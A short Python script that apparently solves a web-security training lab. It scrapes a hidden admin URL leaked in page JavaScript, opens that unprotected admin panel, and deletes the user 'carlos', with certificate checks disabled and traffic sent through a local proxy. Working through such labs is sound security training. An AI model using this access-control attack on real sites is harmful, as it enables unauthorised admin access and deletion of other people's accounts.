import requests
import urllib3
# To install BeautifulSoup4 run => pip install beautifulsoup4
from bs4 import BeautifulSoup
import sys
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"https": "http://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}


def exploit(url):

    response = requests.get(url, verify=False, proxies=proxies)

    session_cookie = response.cookies.get('session')

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        admin_instances = soup.find(string=re.compile("/admin-"))
        admin_path = re.search("'href', '(.*)'", admin_instances).group(1)
        find_admin_path(url, session_cookie, admin_path)
    else:
        print("(-) Something went wrong...terminating script")
        sys.exit(-1)


def find_admin_path(url, session_cookie, admin_path):

    response = requests.get(url + admin_path, verify=False,
                            proxies=proxies, cookies={'session': session_cookie})

    if response.status_code == 200:
        url = url + admin_path
        print("(+) Found admin panel at: \n{}".format(url))
        print("(+) Deleting user carlos...")
        delete_user_carlos(url, session_cookie)
    else:
        print("(-) Something went wrong...unable to find admin panel.")


def delete_user_carlos(url, session_cookie):

    response = requests.get(url + '/delete?username=carlos', verify=False,
                            proxies=proxies, cookies={'session': session_cookie})

    if response.status_code == 200:
        print("(+) Carlos user deleted!")
        sys.exit(-1)
    else:
        print("(-) Unable to delete user carlos...something went wrong.")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:
        url = sys.argv[1]
        exploit(url)


if __name__ == "__main__":
    main()
